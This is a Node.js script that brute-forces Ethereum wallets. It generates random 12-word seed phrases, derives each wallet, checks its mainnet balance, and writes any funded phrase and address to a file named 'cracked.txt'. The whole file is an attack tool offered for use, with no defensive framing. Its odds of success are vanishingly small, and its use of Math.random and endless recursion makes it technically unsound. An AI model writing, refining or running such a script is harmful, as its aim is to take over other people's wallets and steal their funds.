import { words } from './wordList.js';
import { ethers } from "ethers";
import * as fs from 'fs/promises';

const provider = new ethers.getDefaultProvider("homestead", {
    etherscan: process.env.API_KEY
});

async function genSeedPhrase() {
    let seedPhrase = [];
    for (let i = 0; i < 12; i++) {
        let number = Math.floor(Math.random() * 2048);
        seedPhrase.push(words[number]);
    }

    return seedPhrase.join(' ');
}

async function main() {
    let phrase = await genSeedPhrase();
    let isValid = ethers.utils.isValidMnemonic(phrase);

    if (isValid) {
        let walletMnemonic = ethers.Wallet.fromMnemonic(phrase);
        let wallet = walletMnemonic.connect(provider);
        let balance = await wallet.getBalance();

        console.log(`Valid Seed Phrase:\n${phrase}`);
        console.log("Address: " + wallet.address + "\nBalance: " + balance + " ETH\n\n");

        if (balance > 0) {
            try {
                await fs.appendFile('cracked.txt', `${phrase}\n${wallet.address}\n`);
                console.log("Seed phrase and address written to cracked.txt");
            } catch (err) {
                console.error("Error writing to cracked.txt:", err);
            }
            return;
        }

        return main(); // Recursive call to continue the process
    } else {
        return main(); // Retry if the generated seed phrase is not valid
    }
}

main();
